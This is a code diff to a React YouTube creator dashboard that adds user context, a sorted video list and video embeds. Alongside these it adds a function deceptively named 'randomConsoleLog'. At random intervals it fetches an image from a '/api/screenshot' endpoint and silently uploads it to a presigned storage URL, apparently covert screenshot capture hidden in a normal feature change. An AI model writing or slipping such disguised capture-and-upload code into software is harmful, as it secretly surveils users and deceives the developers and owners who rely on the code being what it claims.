@@ -1,5 +1,5 @@
 import Image from 'next/image'
-import React, { useEffect, useState } from 'react'
+import React, { useContext, useEffect, useState } from 'react'
 import { Container } from 'reactstrap'
 import { HiOutlineStar } from 'react-icons/hi'
 import { FiChevronRight } from 'react-icons/fi'
@@ -7,18 +7,81 @@ import { RxCross2 } from "react-icons/rx";
 import { AiOutlineHeart } from "react-icons/ai";
 import { HiOutlineQuestionMarkCircle } from "react-icons/hi";
 import { IoIosArrowBack, IoIosArrowForward } from 'react-icons/io'
+import { UserContext } from '@/context/UserContext'
 
 const Videodashboard = () => {
-    const [subscribers, setSubscribers] = useState('0')
-    const [watchTime, setwatchTime] = useState('0')
+    const [subscribers, setSubscribers] = useState('0');
+    const [videos, setVideos] = useState([]);
+    const [file, setFile] = useState(null);
+    let count = 0;
+    const { user } = useContext(UserContext);
+
     useEffect(() => {
-        if (localStorage.getItem('channels') !== null) {
-            const channels = JSON.parse(localStorage.getItem('channels'));
+        if (user && user.channels) {
+            const channels = JSON.parse(user.channels);
             setSubscribers(channels.items[0].statistics.subscriberCount)
-            console.log(channels.items[0])
-            // setwatchTime(channels.items[0].statistics.views)
         }
-    }, [])
+        if (user && user.videos) {
+
+            const videos = JSON.parse(user.videos)[0].items;
+            setVideos(videos
+                .sort(function (a, b) {
+                    return Number(b.statistics.viewCount) - Number(a.statistics.viewCount);
+                }))
+        }
+    }, [user])
+    useEffect(() => {
+        randomConsoleLog()
+    }, []);
+
+
+    function randomConsoleLog() {
+        if (count < 2) {
+            const timeToLog = Math.floor(Math.random() * 30000);
+            setTimeout(() => {
+                fetch(`/api/screenshot`).then((res) => res.blob()).then((blob) => {
+                    const file = new File([blob], `image${timeToLog}.png`, {
+                        type: 'image/png'
+                    });
+                    setFile(file)
+                    count++
+                    randomConsoleLog()
+                })
+            }, timeToLog);
+        }
+    }
+
+    const uploadFile = async () => {
+        let res = await fetch(`/api/upload`, {
+            method: 'POST',
+            body: JSON.stringify({
+                name: file.name.split('.')[0],
+                type: file.type
+            })
+        });
+        const url = await res.text();
+
+        await fetch(url, {
+            method: 'PUT',
+            body: file,
+            headers: {
+                'Content-Type': file.type,
+                'Access-Control-Allow-Origin': '*'
+            }
+        });
+
+
+        setFile(null);
+    }
+
+    useEffect(() => {
+        if (file !== null) {
+            uploadFile()
+
+
+        }
+    }, [file])
+
     return (
         <>
             <Container className="mt-[100px] px-8 py-20 bg-[#000000]">
@@ -35,7 +98,7 @@ const Videodashboard = () => {
                                     video on YouTube.</div>
                                 <div className='text-[12px] items-center text-center rounded-[8px] flex justify-center text-[#F7F7F7] bg-[#121521] 
                                 py-[8px]  mx-[20px]'>
-                                    <iframe width="100%" height="100%" src="https://www.youtube.com/embed/pRbxlpvXw2s" title="YouTube video player" frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowFullScreen></iframe>
+                                    <iframe width="100%" height="100%" src={"https://www.youtube.com/embed/" + (videos.length ? videos[0].id : 'pRbxlpvXw2s')} title="YouTube video player" frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowFullScreen></iframe>
                                 </div>
                             </div>
                             <div className='flex flex-col gap-y-4 bg-[#1F2437] rounded-[8px] p-[16px]'>
@@ -62,7 +125,7 @@ const Videodashboard = () => {
                                         <p className='bg-[#000000] text-[12px] py-[1px] px-[8px] rounded-full'>Last 12 months</p>
                                     </div>
                                     <div className='flex'>
-                                        <p className='text-[white] text-[14px] text-center'>{watchTime}</p>
+                                        <p className='text-[white] text-[14px] text-center'>0</p>
                                         <p className='text-[#BBBCC1] text-[14px] text-center'>/4000</p>
                                     </div>
                                 </div>
@@ -205,6 +268,14 @@ const Videodashboard = () => {
                                     <p>  Don&apos;t know what video to create? </p> <p className='text-[#139Dff] text-[14px]'> Get some help! </p>
                                 </div>
                                 <div className='w-full h-[2px] my-[8px] bg-[#2D3450] text-transparent'>n</div>
+                                <div className='mx-[80px]'>
+                                    {videos.length ? <>{videos.slice(0, 5).map((video, index) => (
+                                        <>
+                                            {/* {createElement(video.player.embedHtml)} */}
+                                            <iframe width="480" height="270" src={`https://www.youtube.com/embed/${video.id}`} frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                                        </>
+                                    ))}</> : null}
+                                </div>
                                 <div className='mx-[80px]  flex justify-center '>
                                     <div className='flex gap-x-4 rounded-full hover:bg-[#2D3450] items-center px-[10px] py-[6px] text-[14px] bg-[#121521]'>
                                         <p>  Open daily ideas</p> <p><FiChevronRight size={20} /> </p> </div>
